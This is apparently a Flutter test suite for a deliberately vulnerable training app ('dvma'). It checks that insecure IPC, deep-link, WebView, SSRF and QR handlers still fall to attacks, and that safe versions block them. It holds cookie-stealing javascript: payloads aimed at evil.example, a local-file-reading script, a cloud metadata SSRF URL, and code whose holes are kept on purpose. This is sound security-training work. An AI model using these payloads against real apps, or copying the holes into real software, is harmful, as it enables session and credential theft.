import 'package:flutter_test/flutter_test.dart';

import 'package:dvma/modules/platform/cross_app_scripting/cross_app_webview.dart';
import 'package:dvma/modules/platform/grant_uri_permission_abuse/grant_uri_broker.dart';
import 'package:dvma/modules/platform/custom_url_scheme_authorization/custom_scheme_handler.dart';
import 'package:dvma/modules/platform/wkwebview_untrusted_url_local_file/local_file_webview.dart';
import 'package:dvma/modules/platform/confused_deputy_intent_validation/privileged_deputy.dart';
import 'package:dvma/modules/platform/ssrf_url_media_handler/media_fetcher.dart';
import 'package:dvma/modules/platform/qr_url_no_validation/qr_url_handler.dart';

/// Regression suite for the Cross-App Scripting / IPC / URL-handling training
/// modules. Each test asserts the *insecure* behavior is still present (so an
/// accidental "fix" fails CI) AND that the secure contrast blocks the attack.
void main() {
  group('cross_app_scripting', () {
    test(
      'untrusted javascript: intent executes in trusted origin; safe blocks',
      () {
        const trustedOrigin = 'https://app.dvma.example';
        const payload =
            "javascript:fetch('https://evil.example/x?c='+document.cookie)";
        final webView = CrossAppWebView(trustedOrigin: trustedOrigin);

        // VULN: the javascript: value off the untrusted Intent runs in the
        // trusted origin.
        final vuln = webView.loadFromIntent(payload);
        expect(vuln.blocked, isFalse);
        expect(vuln.scriptedTrustedOrigin, isTrue);
        expect(vuln.executed, isNotEmpty);
        expect(vuln.executed.first.origin, trustedOrigin);
        expect(vuln.executed.first.trustedOrigin, isTrue);

        // SECURE: the javascript: scheme is refused; nothing executes.
        final secure = webView.loadFromIntentSafe(payload);
        expect(secure.blocked, isTrue);
        expect(secure.scriptedTrustedOrigin, isFalse);
        expect(secure.executed, isEmpty);

        // SECURE still allows a legitimate in-origin https navigation.
        final ok = webView.loadFromIntentSafe('$trustedOrigin/help');
        expect(ok.blocked, isFalse);
        expect(ok.committedUrl, '$trustedOrigin/help');
      },
    );
  });

  group('grant_uri_permission_abuse', () {
    test(
      'forwarded grant flags leak the private uri; safe strips + allowlists',
      () {
        const intent = ForwardedIntent(
          callerPackage: 'com.evil.exfil',
          targetPackage: 'com.evil.exfil',
          dataUri: GrantUriBroker.privateUri,
          flags: UriGrantFlags(read: true, write: true),
        );

        // VULN: the forwarded intent transitively grants the private URI to the
        // attacker.
        final vuln = GrantUriBroker.forward(intent);
        expect(vuln.leakedToAttacker, isTrue);
        expect(vuln.grantedTo, 'com.evil.exfil');
        expect(vuln.uri, GrantUriBroker.privateUri);
        expect(vuln.effectiveFlags.read, isTrue);
        expect(vuln.effectiveFlags.write, isTrue);

        // SECURE: the untrusted target is refused and flags stripped.
        final secure = GrantUriBroker.forwardSafe(intent);
        expect(secure.leakedToAttacker, isFalse);
        expect(secure.blocked, isTrue);
        expect(secure.grantedTo, isNull);
        expect(secure.effectiveFlags.any, isFalse);

        // SECURE still forwards to a trusted target.
        const trusted = ForwardedIntent(
          callerPackage: 'com.evil.exfil',
          targetPackage: 'com.dvma.companion',
          dataUri: GrantUriBroker.privateUri,
          flags: UriGrantFlags(read: true),
        );
        final ok = GrantUriBroker.forwardSafe(trusted);
        expect(ok.blocked, isFalse);
        expect(ok.grantedTo, 'com.dvma.companion');
      },
    );
  });

  group('custom_url_scheme_authorization', () {
    test(
      'handler loads caller url with no checks; safe enforces allowlist',
      () {
        const deepLink =
            'dvma://open?url=https://evil.example/phish?session=steal';

        // VULN: the attacker-supplied url is displayed.
        final vuln = CustomSchemeHandler.handle(deepLink);
        expect(vuln.blocked, isFalse);
        expect(vuln.displayedUntrusted, isTrue);
        expect(vuln.displayedUrl, contains('evil.example'));

        // SECURE: the untrusted host is refused.
        final secure = CustomSchemeHandler.handleSafe(deepLink);
        expect(secure.blocked, isTrue);
        expect(secure.displayedUrl, isNull);

        // SECURE still displays a trusted-host https url.
        final ok = CustomSchemeHandler.handleSafe(
          'dvma://open?url=https://app.dvma.example/home',
        );
        expect(ok.blocked, isFalse);
        expect(ok.displayedUrl, 'https://app.dvma.example/home');
      },
    );
  });

  group('wkwebview_untrusted_url_local_file', () {
    test(
      'unescaped reflection + file access reads local files; safe blocks',
      () {
        const payload =
            "<script>fetch('file:///var/app/Documents/session.json')</script>";

        // VULN: the injected script runs and reads the app's local files.
        final webView = LocalFileWebView(fileAccessEnabled: true);
        final vuln = webView.reflect(payload);
        expect(vuln.scriptExecuted, isTrue);
        expect(vuln.leakedLocalFiles, isTrue);
        expect(vuln.fileAccessEnabled, isTrue);
        expect(
          vuln.exfiltratedFiles['file:///var/app/Documents/session.json'],
          contains('tok-8b21-secret'),
        );

        // SECURE: escaped reflection + file access disabled -> nothing leaks.
        final secure = webView.reflectSafe(payload);
        expect(secure.scriptExecuted, isFalse);
        expect(secure.leakedLocalFiles, isFalse);
        expect(secure.fileAccessEnabled, isFalse);
        expect(secure.exfiltratedFiles, isEmpty);
      },
    );
  });

  group('confused_deputy_intent_validation', () {
    test('deputy acts for unprivileged caller; safe verifies permission', () {
      const malicious = DeputyRequest(
        callerPackage: 'com.evil.localapp',
        callerHoldsPermission: false,
        action: PrivilegedDeputy.privilegedAction,
        targetSetting: 'adb_enabled=1',
      );

      // VULN: only the action string is checked, so the privileged op runs for
      // the unprivileged caller.
      final vuln = PrivilegedDeputy.handle(malicious);
      expect(vuln.performed, isTrue);
      expect(vuln.abusedByUnprivileged, isTrue);
      expect(vuln.onBehalfOf, 'com.evil.localapp');
      expect(vuln.setting, 'adb_enabled=1');

      // SECURE: the caller lacks the permission -> denied.
      final secure = PrivilegedDeputy.handleSafe(malicious);
      expect(secure.performed, isFalse);
      expect(secure.abusedByUnprivileged, isFalse);
      expect(secure.onBehalfOf, isNull);

      // SECURE still performs the action for a properly-permissioned caller.
      const privileged = DeputyRequest(
        callerPackage: 'com.dvma.app',
        callerHoldsPermission: true,
        action: PrivilegedDeputy.privilegedAction,
        targetSetting: 'adb_enabled=1',
      );
      final ok = PrivilegedDeputy.handleSafe(privileged);
      expect(ok.performed, isTrue);
      expect(ok.onBehalfOf, 'com.dvma.app');
    });
  });

  group('ssrf_url_media_handler', () {
    test(
      'loader fetches internal metadata url; safe allowlists public hosts',
      () {
        const metadataUrl =
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/';

        // VULN: the internal/metadata endpoint is reached.
        final vuln = MediaFetcher.fetch(metadataUrl);
        expect(vuln.dispatched, isTrue);
        expect(vuln.reachedInternal, isTrue);

        // A loopback URL is also reachable on the vuln path.
        final loopback = MediaFetcher.fetch('http://127.0.0.1:8080/admin');
        expect(loopback.reachedInternal, isTrue);

        // SECURE: non-https + non-allowlisted host is refused.
        final secure = MediaFetcher.fetchSafe(metadataUrl);
        expect(secure.dispatched, isFalse);
        expect(secure.reachedInternal, isFalse);

        // SECURE still fetches an allowlisted public https host.
        final ok = MediaFetcher.fetchSafe(
          'https://cdn.dvma.example/image/1.png',
        );
        expect(ok.dispatched, isTrue);
        expect(ok.reachedInternal, isFalse);
      },
    );
  });

  group('qr_url_no_validation', () {
    test('scanned javascript: payload opens; safe refuses dangerous schemes', () {
      const payload =
          "javascript:document.location='https://evil.example/?c='+document.cookie";

      // VULN: the QR payload is opened/executed as a trusted URL.
      final vuln = QrUrlHandler.handle(payload);
      expect(vuln.opened, isTrue);
      expect(vuln.action, QrAction.executeJavascript);
      expect(vuln.openedDangerous, isTrue);

      // A privileged deeplink is also opened on the vuln path.
      final deeplink = QrUrlHandler.handle('dvma://admin/reset?force=1');
      expect(deeplink.opened, isTrue);
      expect(deeplink.action, QrAction.openDeeplink);
      expect(deeplink.openedDangerous, isTrue);

      // SECURE: the javascript: payload is refused.
      final secure = QrUrlHandler.handleSafe(payload);
      expect(secure.opened, isFalse);
      expect(secure.action, QrAction.refused);
      expect(secure.openedDangerous, isFalse);

      // SECURE also refuses privileged in-app deeplinks from an untrusted QR.
      final secureDeeplink = QrUrlHandler.handleSafe(
        'dvma://admin/reset?force=1',
      );
      expect(secureDeeplink.opened, isFalse);
      expect(secureDeeplink.action, QrAction.refused);

      // SECURE still opens a plain https external link.
      final ok = QrUrlHandler.handleSafe('https://example.com/promo');
      expect(ok.opened, isTrue);
      expect(ok.action, QrAction.openExternalUrl);
    });
  });
}
